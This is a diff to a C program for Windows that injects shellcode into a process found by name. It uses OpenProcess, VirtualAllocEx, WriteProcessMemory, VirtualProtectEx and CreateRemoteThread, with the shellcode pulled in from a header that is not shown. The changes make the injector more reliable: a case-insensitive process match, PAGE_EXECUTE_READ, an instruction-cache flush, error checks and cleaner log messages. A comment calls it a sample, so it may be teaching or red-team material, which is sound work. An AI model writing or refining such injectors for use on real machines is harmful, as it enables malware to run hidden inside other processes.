@@ -4,7 +4,6 @@
 #include "shellcode.h"
 
 #define MAX_PROCESS_NAME 260
-#define MAX_DLL_PATH 260
 
 // Returns the PID of the first process matching procName, or 0 if not found.
 // Multiple instances of the same image are out of scope for this sample.
@@ -21,7 +20,7 @@ static DWORD FindProcessId(const WCHAR* procName) {
 	DWORD pid = 0;
 	if (Process32FirstW(hSnap, &pe)) {
 		do {
-			if (wcscmp(procName, pe.szExeFile) == 0) {
+			if (_wcsicmp(procName, pe.szExeFile) == 0) {
 				pid = pe.th32ProcessID;
 				break;
 			}
@@ -53,7 +52,7 @@ int main(void) {
 
 	hProc = OpenProcess(
 		PROCESS_CREATE_THREAD |		// CreateRemoteThread
-		PROCESS_VM_OPERATION |		// VirtualAllocEx
+		PROCESS_VM_OPERATION |		// VirtualAllocEx, VirtualProtectEx
 		PROCESS_VM_WRITE,			// WriteProcessMemory
 		FALSE, pid);
 	if (hProc == NULL) {
@@ -72,14 +71,16 @@ int main(void) {
 		wprintf(L"WriteProcessMemory failed. Error: %lu\n", GetLastError());
 		goto cleanup;
 	}
-	wprintf(L"[+] Wrote the Shellcode into the target\n");
+	wprintf(L"[+] Wrote the shellcode into the target\n");
 
 	DWORD oldProtect;
-	if (!VirtualProtectEx(hProc, pMem, codeSize, PAGE_EXECUTE, &oldProtect)) {
+	if (!VirtualProtectEx(hProc, pMem, codeSize, PAGE_EXECUTE_READ, &oldProtect)) {
 		wprintf(L"VirtualProtectEx failed. Error: %lu\n", GetLastError());
 		goto cleanup;
 	}
-	wprintf(L"[+] Change the protection of the memory\n");
+	wprintf(L"[+] Changed the memory protection to PAGE_EXECUTE_READ\n");
+
+	FlushInstructionCache(hProc, pMem, codeSize);
 
 	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
 	if (hThread == NULL) {
@@ -91,12 +92,15 @@ int main(void) {
 	WaitForSingleObject(hThread, INFINITE);
 
 	DWORD exitCode = 0;
-	GetExitCodeThread(hThread, &exitCode);
+	if (!GetExitCodeThread(hThread, &exitCode)) {
+		wprintf(L"GetExitCodeThread failed. Error: %lu\n", GetLastError());
+		goto cleanup;
+	}
 	if (exitCode == 0) {
 		wprintf(L"Shellcode failed to resolve its APIs.\n");
 		goto cleanup;
 	}
-	wprintf(L"[+] Shellcode execute successfully\n");
+	wprintf(L"[+] Shellcode executed successfully\n");
 	rc = 0;
 
 cleanup:
